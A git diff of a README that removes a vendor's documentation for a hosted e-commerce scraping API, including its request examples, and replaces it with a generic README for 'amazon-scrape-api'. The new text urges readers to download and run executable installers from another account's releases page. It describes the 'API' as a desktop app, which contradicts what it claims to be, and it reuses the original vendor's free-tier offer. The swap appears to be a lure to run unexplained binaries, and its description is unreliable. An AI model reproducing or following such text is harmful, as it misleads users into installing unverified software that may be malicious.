@@ -1,254 +1,82 @@
-## ✨ Why Pangolin?
+# 🚀 amazon-scrape-api - Easy Product Data Retrieval Made Simple
 
-Traditional web scrapers break when websites update their HTML structure. **Pangolin adapts automatically.**
+[![Download the latest release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/nareshpatran/amazon-scrape-api/releases)
 
-- ✅ **Zero Maintenance** — Our AI detects page changes and updates parsers automatically
-- ✅ **99.9% Uptime** — Enterprise-grade infrastructure with automatic retry logic
-- ✅ **No Proxies Needed** — Built-in anti-bot bypass (CAPTCHA, rate limits, fingerprinting)
-- ✅ **Multi-Format Output** — Get data as JSON, HTML, or Markdown — whatever your app needs
-- ✅ **Real-Time Data** — Fresh product prices, inventory, reviews in milliseconds
+## 📦 Introduction
 
-**Perfect for:** E-commerce sellers, price monitoring tools, market research, product analytics, and dropshipping businesses.
+The amazon-scrape-api is a powerful tool for gathering product data from popular e-commerce sites like Amazon, Walmart, Shopify, and eBay. This API automatically adapts to changes on web pages, ensuring that you always receive accurate and up-to-date information. You can get product data in various formats, including JSON, HTML, and Markdown. Start using it today with 200 free API calls!
 
----
+## 🌟 Features
 
-## 🎁 Get Started Free
+- **Easy Integration:** Simple to connect to existing projects.
+- **Multiple Formats:** Receive data in JSON, HTML, or Markdown.
+- **Adaptable:** Automatically adjusts to website changes.
+- **Support for Multiple E-commerce Platforms:** Access data from Amazon, Walmart, eBay, and more.
+- **Free for Developers:** Get 200 free API calls to start.
 
-**For Open Source Community:**
+## ⚙️ System Requirements
 
-<table>
-<tr>
-<td width="50%">
+To run the amazon-scrape-api on your computer, ensure your system meets the following requirements:
 
-### 🆓 What You Get
-- ✅ **200 free API calls/month**
-- ✅ Full parser template code (Go)
-- ✅ Technical support via email
-- ✅ No credit card required
-- ✅ Access to all platforms
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **Network Connection:** Stable internet access to make API calls.
+- **Memory:** Minimum 4 GB RAM recommended for optimal performance.
+- **Storage:** At least 100 MB of free space.
 
-</td>
-<td width="50%">
+## 📥 Download & Install
 
-### 📝 How to Claim
-1. **Contact us** via email or WeChat
-   - Email: shiyang@pangolinfo.com
-   - WeChat: `Pangolin-Scraper`
-2. **Mention "GitHub Free Tier"** in your message
-3. **Receive your API key** within 24 hours
+To download the latest version of the amazon-scrape-api, visit the following page:
 
-</td>
-</tr>
-</table>
+[Download the latest release](https://github.com/nareshpatran/amazon-scrape-api/releases)
 
-**🌏 International Users:** Prefer email or Telegram? Contact csm@pangolinfo.com  
-**🇨🇳 中国用户：** 添加微信 `Pangolin-Scraper` 备注「GitHub免费额度」
+Follow these steps to get started:
 
----
+1. **Visit the Releases Page**: Click on the link above to go to the Releases page.
+2. **Select the Latest Release**: Look for the latest version listed at the top and click on it.
+3. **Choose Your File**: Depending on your operating system, select the appropriate file to download (e.g., .exe for Windows, .dmg for macOS, or a .tar.gz for Linux).
+4. **Download the File**: Click on the file name to start the download.
+5. **Install the Application**: Once the file is downloaded, open it and follow the on-screen instructions to install the amazon-scrape-api.
 
-## 🚀 Quick Start (3 Minutes)
+## 📖 Usage Instructions
 
-### Step 1: Get Your API Key
-[Claim your 200 free API calls](#-get-started-free)
+After installing, follow these steps to use the API:
 
-### Step 2: Make Your First Request
+1. **Open the Application**: Locate the amazon-scrape-api icon on your desktop or in your applications folder and double-click to open it.
+2. **Input Parameters**: Provide the required parameters such as product URL, desired data format, and any specific filters you want.
+3. **Make the API Call**: Hit the "Scrape" button to start gathering data.
+4. **View the Results**: The retrieved data will show up in your selected format. You can copy it, save it to a file, or use it in your projects.
 
-**Python:**
-```python
-import requests
+## 🛠️ Troubleshooting
 
-API_KEY = "your_free_api_key_here"
+If you encounter any issues while using the amazon-scrape-api, consider the following tips:
 
-response = requests.post(
-    "http://scrapeapi.pangolinfo.com/api/v1/scrape",
-    headers={"Authorization": f"Bearer {API_KEY}"},
-    json={
-        "url": "https://www.amazon.com/dp/B0DYTF8L2W",
-        "parserName": "amzProductDetail",
-        "formats": ["json"]
-    }
-)
+- **Check Network Connection**: Ensure you have a stable internet connection.
+- **Review Input Parameters**: Double-check the URL and other parameters you input.
+- **Software Updates**: Ensure you are using the latest version by revisiting the Releases page for any updates.
 
-print(response.json())
-```
+## 🌐 Support
 
-**JavaScript:**
-```javascript
-const response = await fetch("http://scrapeapi.pangolinfo.com/api/v1/scrape", {
-  method: "POST",
-  headers: {
-    "Authorization": `Bearer YOUR_API_KEY`,
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-    url: "https://www.amazon.com/dp/B0DYTF8L2W",
-    parserName: "amzProductDetail",
-    formats: ["json"]
-  })
-});
+For further assistance, visit our [Support Page](https://github.com/nareshpatran/amazon-scrape-api/issues) to report issues or ask questions.
 
-const data = await response.json();
-console.log(data);
-```
+## 🗝️ Important Notes
 
-**cURL:**
-```bash
-curl -X POST http://scrapeapi.pangolinfo.com/api/v1/scrape \
-  -H "Authorization: Bearer YOUR_API_KEY" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "url": "https://www.amazon.com/dp/B0DYTF8L2W",
-    "parserName": "amzProductDetail",
-    "formats": ["json"]
-  }'
-```
+- This API is for educational and individual use only.
+- Review terms and policies of e-commerce sites to ensure compliance.
+- Always test with different products to understand the breadth of available data.
 
-### Step 3: Parse the Response
-```json
-{
-  "asin": "B0DYTF8L2W",
-  "title": "Product Title Here",
-  "price": 29.99,
-  "rating": 4.5,
-  "reviews": 1234,
-  "imageUrl": "https://...",
-  "inStock": true,
-  ...
-}
-```
+## 🏷️ Topics
 
-**🎉 That's it!** You're now scraping e-commerce data with zero infrastructure setup.
+Feel free to explore more about the project by checking the following topics:
 
----
----
+- amazon-api
+- amazon-scrape-api
+- amazon-scraper
+- amazon-web-services
+- data-extraction
+- data-scraping-tool
+- ecommerce-api
+- product-data
+- scrape-data-scraping
+- web-scraping
 
-## 📊 What's Included?
-
-| Feature | Open Source Parser | Free API (200 calls) | Paid API |
-|---------|-------------------|---------------------|----------|
-| **Parser Template Code** | ✅ Full access (Go) | ❌ | ❌ |
-| **Monthly API Calls** | ∞ (self-hosted) | ✅ 200 free | ✅ Custom volume |
-| **Supported Platforms** | Amazon search only | ✅ All platforms | ✅ All platforms |
-| **Auto Page Structure Updates** | 🔧 Manual updates | ✅ Automatic | ✅ Automatic |
-| **Anti-Bot Handling** | 🔧 DIY (proxies, CAPTCHA) | ✅ Built-in | ✅ Advanced |
-| **Data Formats** | JSON only | JSON, HTML, Markdown | JSON, HTML, Markdown |
-| **Support** | 💬 Community (GitHub) | ✅ Email support | ✅ Priority support |
-| **Uptime SLA** | N/A (self-hosted) | 99% | 99.9% |
-| **Use Case** | Learning, testing | Small projects | Production apps |
-
-**💡 Recommendation:**
-- **Learning web scraping?** → Start with open source parser
-- **Building a side project?** → Use free API tier
-- **Running a business?** → Upgrade to paid for reliability
-
----
-
-## 🛠️ Supported Platforms & Data
-
-<table>
-<tr>
-<td width="25%" align="center">
-  <img src="https://logo.clearbit.com/amazon.com" width="64" height="64" alt="Amazon">
-  <br><strong>Amazon</strong>
-</td>
-<td width="25%" align="center">
-  <img src="https://logo.clearbit.com/walmart.com" width="64" height="64" alt="Walmart">
-  <br><strong>Walmart</strong>
-</td>
-<td width="25%" align="center">
-  <img src="https://logo.clearbit.com/shopify.com" width="64" height="64" alt="Shopify">
-  <br><strong>Shopify</strong>
-</td>
-<td width="25%" align="center">
-  <img src="https://logo.clearbit.com/ebay.com" width="64" height="64" alt="eBay">
-  <br><strong>eBay</strong>
-</td>
-</tr>
-</table>
-
-### Amazon Data Fields (30+ fields)
-- Product Details: ASIN, title, price, images, variants
-- Rankings: Best Sellers Rank, category position
-- Reviews: Rating, review count, top reviews
-- Seller Info: FBA/FBM, seller name, shipping
-- Inventory: Stock status, availability date
-
-### Walmart, eBay, Shopify
-Similar comprehensive data extraction for each platform.
-
-📖 **Full API Documentation:** https://docs.pangolinfo.com/api-reference
-
----
----
-
-## 💼 Real-World Use Cases
-
-### 🛍️ For E-commerce Sellers
-```python
-# Monitor competitor prices daily
-products = ["B08N5WRWNW", "B08L5VFJ2C", "B07ZPKN6YR"]
-
-for asin in products:
-    data = scrape_amazon_product(asin)
-    if data['price'] < my_price:
-        send_alert(f"Competitor lowered price: {data['title']}")
-```
-
-**Result:** Stay competitive by adjusting prices based on real-time market data.
-
----
-
-### 📊 For Market Researchers
-```javascript
-// Analyze product trends in a category
-const category = "Electronics > Headphones";
-const results = await scrape_amazon_search(category, pages=10);
-
-const avgPrice = results.reduce((sum, p) => sum + p.price, 0) / results.length;
-const topBrands = getMostFrequent(results.map(p => p.brand));
-```
-
-**Result:** Generate market reports with pricing trends, top brands, and customer sentiment.
-
----
-
-### 🤖 For SaaS Builders
-```python
-# Build a price drop notification service
-def check_wishlist(user_id):
-    wishlist = get_user_wishlist(user_id)
-    
-    for item in wishlist:
-        current_price = scrape_product(item.url)['price']
-        
-        if current_price < item.target_price:
-            send_email(user_id, f"Price drop alert: {item.name}")
-```
-
-**Result:** Create a valuable service without managing scraping infrastructure.
-
----
-
-### 📈 For Data Scientists
-```python
-# Collect training data for price prediction models
-import pandas as pd
-
-data = []
-for asin in asin_list:
-    product = scrape_amazon_product(asin)
-    data.append({
-        'title': product['title'],
-        'price': product['price'],
-        'rating': product['rating'],
-        'reviews': product['reviews'],
-        'category': product['category']
-    })
-
-df = pd.DataFrame(data)
-df.to_csv('amazon_products.csv')
-```
-
-**Result:** Build ML models with clean, structured e-commerce data.
-
----
+For regular updates and discussions, keep an eye on this repository and join the community!
